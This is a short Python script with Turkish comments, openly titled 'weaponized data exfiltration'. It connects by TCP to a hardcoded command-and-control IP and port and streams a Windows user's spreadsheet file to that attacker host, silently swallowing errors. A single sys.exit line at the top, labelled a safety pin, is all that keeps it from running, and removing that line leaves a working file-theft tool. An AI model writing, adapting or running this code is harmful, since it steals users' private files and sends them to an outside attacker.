import os
import sys
import socket

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod verileri internete sızdırır (Exfiltration).")

print("--- WEAPONIZED DATA EXFILTRATION ---")

def exfiltrate_file(filepath):
    # 1. SUNUCU BAĞLANTISI (Weaponized Part)
    # Simülasyon: shutil.copy(filepath, "Backup")
    # Gerçek: Veriyi okuyup TCP soketiyle saldırgana yolla.
    
    attacker_ip = "45.10.20.30" # C2 IP
    attacker_port = 9000
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((attacker_ip, attacker_port))
        
        # Dosya adını gönder
        s.send(f"{os.path.basename(filepath)}\n".encode())
        
        # İçeriği gönder
        with open(filepath, "rb") as f:
            chunk = f.read(4096)
            while chunk:
                s.send(chunk)
                chunk = f.read(4096)
                
        print(f"💀 GÖNDERİLDİ: {filepath}")
        s.close()
        
    except Exception as e:
        pass

if __name__ == "__main__":
    exfiltrate_file("C:\\Users\\Admin\\Documents\\Bilanço.xlsx")